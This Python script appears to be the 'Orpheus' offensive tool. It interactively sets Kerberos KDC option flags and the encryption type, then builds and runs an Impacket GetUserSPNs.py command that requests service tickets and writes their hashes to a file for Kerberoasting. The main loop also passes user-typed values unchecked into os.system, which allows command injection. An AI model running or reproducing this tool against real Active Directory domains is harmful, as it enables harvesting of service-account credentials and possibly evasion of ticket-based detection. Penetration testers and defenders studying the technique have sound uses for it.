#!/usr/bin/python3

import os
from impacket.krb5 import constants
from signal import signal, SIGINT

kdcopt = "0x40810010"
cred = "domain.local/username:password"
dcip = "10.1.1.1"
file = "spns.txt"
scale = 16
enctype = 23
kdcbin = bin(int(kdcopt, scale))[2:].zfill(32)
cmd = ''

class termcolor:
    WHITE = '\033[37m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    RED = '\033[31m'
    END = '\033[0m'
    BOLD = '\033[1m'
    LIGHTBLUE = '\033[94m'
    LIGHTRED = '\033[91m'

def signal_handler(sig, frame): 
    print('')
    print('Type exit to exit. Press enter to continue...')

def banner():
    global kdcopt, kdcbin, cmd, enctype
    print(termcolor.BLUE + termcolor.BOLD + '        |\\  ' + termcolor.END)
    print(termcolor.BLUE + termcolor.BOLD + '___|\\___|\\\\___██████__██████__██████__██___██_███████_██____██_███████______' + termcolor.END)
    print(termcolor.BLUE + termcolor.BOLD + '___|/__@\'_\\|_██____██_██___██_██___██_██___██_██______██____██_██________|__||' + termcolor.END)
    print(termcolor.BLUE + termcolor.BOLD + '__/|_______|_██____██_██████__██████__███████_█████___██____██_███████___|__||' + termcolor.END)
    print(termcolor.BLUE + termcolor.BOLD + '_(_/_\\____@\'_██____██_██___██_██______██___██_██______██____██______██__@\'__||' + termcolor.END)
    print(termcolor.BLUE + termcolor.BOLD + '__\\|/_________██████__██___██_██______██___██_███████__██████__███████______||' + termcolor.END)

    print(termcolor.LIGHTBLUE + '                   Author: ' + termcolor.WHITE + termcolor.BOLD + 'Ben Ten (@ben0xa)' + termcolor.END + termcolor.WHITE + ' - ' + termcolor.LIGHTBLUE + 'Version: ' + termcolor.WHITE + termcolor.BOLD + '0.1' + termcolor.END)
    print('')
    print(termcolor.GREEN + termcolor.BOLD + '[+]' + termcolor.END + ' KDC Options:')

    onoff = '[OFF]'
    oncolor = termcolor.GREEN
    optlines = list()
    optidx = -1
    for option in constants.KDCOptions:
        optname = option.name.replace('_', ' ').title()
        v = kdcbin[option.value:option.value + 1]
        if v == '1':
            onoff = '[ON] '
            oncolor = termcolor.GREEN
        else:
            onoff = '[OFF]'
            oncolor = termcolor.RED
        line = '    (' + '{:2}'.format(option.value) + ') ' + '{:25s}'.format(optname) + oncolor + termcolor.BOLD + onoff + termcolor.END
        optidx += 1
        if optidx >= 11:
            optlines[optidx - 11] = optlines[optidx - 11] + line
        else:
            optlines.append(line)

    for optline in optlines:
        print(optline)

    print('')

    print(termcolor.GREEN + termcolor.BOLD + '[+]' + termcolor.END + '{:31s}'.format(' Ticket Options Value:') + termcolor.WHITE + termcolor.BOLD + '[' + kdcopt + ']' + termcolor.END)
    print('')
    print(termcolor.GREEN + termcolor.BOLD + '[+]' + termcolor.END + '{:31s}'.format(' GetUserSPNs.py Parameters:') + termcolor.END)
    print('    ' + '{:30s}'.format('(cred) Credentials') + termcolor.YELLOW + termcolor.BOLD + '[' + cred + ']' + termcolor.END)
    print('    ' + '{:30s}'.format('(dcip) Domain IP Address') + termcolor.YELLOW + termcolor.BOLD + '[' + dcip + ']' + termcolor.END)
    print('    ' + '{:30s}'.format('(file) Filename') + termcolor.YELLOW + termcolor.BOLD + '[' + file + ']' + termcolor.END)
    print('    ' + '{:30s}'.format('(enc) Encryption') + termcolor.YELLOW + termcolor.BOLD + '[' + str(enctype) + ']' + termcolor.END)
    print('')

def pycommand():
    print('')    
    print(termcolor.WHITE + termcolor.BOLD + cmd + termcolor.END)
    print('')

def updatecmd():
    global cmd
    cmd = 'python3 ./GetUserSPNs.py \'' + cred + '\' -dc-ip ' + dcip + ' -request -outputfile ' + file + ' -options \"' + kdcopt + '\"' + ' -encryption \"' + str(enctype) + '\"'

def commands():
    print('')
    print('Commands:')
    print('    ' + '{:30s}'.format('0 to 31') + termcolor.WHITE + 'Toggles the specific KDC Option flag.' + termcolor.END)
    print('    ' + '{:30s}'.format('hex <value>') + termcolor.WHITE + 'Sets KDC Options from a hexadecimal value.' + termcolor.END)
    print('    ' + '{:30s}'.format('cred <value>') + termcolor.WHITE + 'Sets the GetUserSPNs.py credential parameter.' + termcolor.END)
    print('    ' + '{:30s}'.format('dcip <value>') + termcolor.WHITE + 'Sets the GetUserSPNs.py domain IP parameter.' + termcolor.END)
    print('    ' + '{:30s}'.format('file <value>') + termcolor.WHITE + 'Sets the GetUserSPNs.py filename parameter.' + termcolor.END)
    print('    ' + '{:30s}'.format('enc') + termcolor.WHITE + 'Toggles the encryption type from 23 (RC4) to 18 (AES-256).' + termcolor.END)
    print('    ' + '{:30s}'.format('command') + termcolor.WHITE + 'Show the GetUserSPNs.py command with specified options.' + termcolor.END)
    print('    ' + '{:30s}'.format('run') + termcolor.WHITE + 'Runs GetUserSPNs.py with the selected options.' + termcolor.END)
    print('    ' + '{:30s}'.format('clear') + termcolor.WHITE + 'Clears the screen and displays the options.' + termcolor.END)
    print('    ' + '{:30s}'.format('exit') + termcolor.WHITE + 'Exits the script.' + termcolor.END)
    print('')

def main():
    global kdcopt, kdcbin, scale, cred, dcip, file, cmd, enctype
    os.system('clear')
    banner()
    updatecmd()
    rsp = 0
    while rsp != 'exit':                
        rsp = input(termcolor.LIGHTBLUE + "orpheus " + termcolor.LIGHTRED + "(command)" + termcolor.LIGHTBLUE + " > " + termcolor.END)        
        if rsp!= 'exit':
            if rsp.isdigit():
                irsp = int(rsp)
                if irsp >= 0 and irsp <=31:
                    val = kdcbin[irsp:irsp+1]
                    if val == "0":
                        val = "1"
                    else:
                        val = "0"
                    left = kdcbin[:irsp]
                    right = kdcbin[irsp+1:]
                    kdcbin = left + val + right
                    kdcopt = hex(int(kdcbin, 2))
                os.system('clear')
                banner()
            elif rsp == 'run':
                os.system(cmd)
            elif 'hex' in rsp:
                hcmd = rsp[4:]
                try:
                    kdcbin = bin(int(hcmd, scale))[2:].zfill(32)
                    kdcopt = hex(int(kdcbin, 2))
                    os.system('clear')
                    banner()
                except:
                    print("Invalid hexadecimal value.")
            elif 'cred' in rsp:
                cred = rsp[5:]
                os.system('clear')
                banner()
            elif 'file' in rsp:
                file = rsp[5:]
                os.system('clear')
                banner()
            elif 'dcip' in rsp:
                dcip = rsp[5:]
                os.system('clear')
                banner()
            elif 'enc' in rsp:
                if enctype == 18:
                    enctype = 23
                else:
                    enctype = 18
                os.system('clear')
                banner()
            elif rsp == 'help':
                commands()
            elif rsp == 'command':
                pycommand()
            elif rsp == 'clear':
                os.system('clear')
                banner()
            else:
                print("Invalid command. Type help.")
        updatecmd()

if __name__ == '__main__':
    signal(SIGINT, signal_handler)
    main()
